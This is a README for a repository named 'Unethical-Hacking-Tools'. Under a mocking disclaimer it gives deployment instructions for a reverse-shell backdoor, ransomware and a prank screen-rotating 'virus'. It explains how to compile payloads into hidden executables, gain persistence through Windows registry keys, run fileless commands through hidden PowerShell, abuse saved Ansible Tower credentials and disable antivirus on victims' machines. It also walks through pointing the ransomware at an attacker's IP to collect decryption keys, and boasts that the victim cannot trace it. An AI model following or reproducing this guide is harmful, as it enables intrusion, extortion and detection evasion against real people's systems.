# Unethical-Hacking-Tools
![Ethical Hacking](https://t3.ftcdn.net/jpg/02/04/94/58/360_F_204945831_yzvd0Ult5kS5yjXDUjoHxMgUCE63KKf9.jpg)
![V for vendetta](https://m.media-amazon.com/images/M/MV5BMjAxNTE4NTcxNl5BMl5BanBnXkFtZTcwNTk0MTYyNw@@._V1_.jpg)
##
## Disclaimer
## !!!! This repo does NOT encourage unethical hacktivism !!!!!!
## !!!! My Cybersecurity Mentor Jimmy did NOT teach me this !!!!
## 
## This repo is for learning & professional development purposes
## If you do NOT follow rules below, YOU GO TO JAIL ;)
## 
## Rule 1:
## Ask your victims for permissions before doing any of these
##
## Rule 2:
## Do NOT launch these shit without black & white permissions
## 
## Rule 3:
## Do NOT get addicted to these crazy shit
##
## Please ONLY run these scripts on your victims, NOT your good selves...
##
## Best Practices for compiling malware to .exe:
## Use Python compiler cx_Freeze
## Reside the .exe & .dll to your targets
## Gain persistency using Registry keys in Windows
## 
## Installing cx_Freeze
## python -m pip install cx_Freeze --user IGS;
##
## Compiling a single .py file:
## python -m cx_Freeze single.py;
##
## Approach 2
## Use Python compiler pyinstaller
## python -m pyinstaller single.py --onefile --noconsole;
## Reside the only .exe to your targets
## Gain persistency using Registry keys in Windows
##
## Approach 3
## Fileless hacking
## Launching all these crazy shit using encrypted SSH tunnels
## 
## Encapsulate these maliacious payloads on Windows/ Linux using: 
## Fileless malicious payloads
## Windows => open cmd.exe:
## cmd terminal type:
## Powershell.exe -windowStyle hidden -command "line1; line2; line3; line4"
##
## Linux:
## Bash terminal:
## printf "import time, rotatescreen as rs\npd = rs.get_primary_display()\nangle_list = [0, 90, 180, 270, 90, 180, 90, 270]\nwhile True:\n\tfor i in range(5):\n\t\tfor x in angle_list:\n\t\t\tpd.rotate_to(x)\n\t\t\ttime.sleep(0.5)" > virus.py &&
## python ./virus.py &&
## rm -rf tempDir/virus.py
## 
## Approach 4
## Grab an Ansible Tower => Enumerate a user with careless saved password for Privilege Escalation => using "commands" entry to bypass artifactory code screening with using a playbook
## Send Fileless malicious payloads
## Windows => open cmd.exe:
## cmd terminal type:
## Powershell.exe -windowStyle hidden -command "line1; line2; line3; line4"
##
## Linux:
## Bash terminal:
## printf "import time, rotatescreen as rs\npd = rs.get_primary_display()\nangle_list = [0, 90, 180, 270, 90, 180, 90, 270]\nwhile True:\n\tfor i in range(5):\n\t\tfor x in angle_list:\n\t\t\tpd.rotate_to(x)\n\t\t\ttime.sleep(0.5)" > virus.py &&
## python ./virus.py &&
## rm -rf tempDir/virus.py
##
## Thus, no one can easily trace what the heck you did to them
##
## If you persist doing these crazy shit without formal permissions
## I hope you do NOT get caught & go to jail...
##
## Do NOT blame this repository owner
## This repository owner NEVER suggests hacktivism
## This repository owner suggests continuous learning & defending by mimicking why & how malicious hackers portrait their skills
##
## ============================================
## Usage
## Dependencies
## bash install-modules.sh
##
## ============================================
## Backdoor
## Victims' machines:
## Use your creativity to find the way to run code in reverse_shell.py
##
## Backdoor Server:
## Use your creativity to host server.py in somewhere safe ;)
## 
## ============================================
## Ransomware:
##
## On Victim's machine => Disable Virus & threat protection
## Edit settings => Disable all
## 
## Or you may research the theory on how files' metadata hash is
## used in anti-virus scanning virus & 
## Create your own way to bypass Anti-virus e.g. Checkpoint ;)
## https://usa.kaspersky.com/resource-center/threats/combating-antivirus
##
##
## cd Unethical-Hacking-Tools &&
## Edit the listening server IP in server.py in line 11 
## to your attacker machine IP
## 
## Run the server.py to start listening
## python ./Ransomware/server.py;
##
## On your victim's machine 
## Edit the IP_ADDRESS in line 109 to attacker's machine IP
## run encryption.py code by whatever malicious means you can imagine
## 
## Go back to your attacker's machine
## Check out encrypted_hosts.txt for decryption key
##
## On victim's machine, run decryption.py code by whatever means
## Enter the decryption key in 'encrypted_hosts.txt' 
## to decrypt the locked files
##
## You may change the path for encryption where the encryption script runs at
##
## ============================================
##
## Never store this kind of stuff on your/your victims PCs
## Otherwise, you go to jail...
##
## Bash
## sudo python -m pip install rotate-screen --user root &&
## cd tempDir &&
## 
## echo "pythonCode" > *.py &
##
## Please proceed with extra due care & sincerity
##
## Enjoy :D
##
## git clone <.git>
## sudo python3 *.py
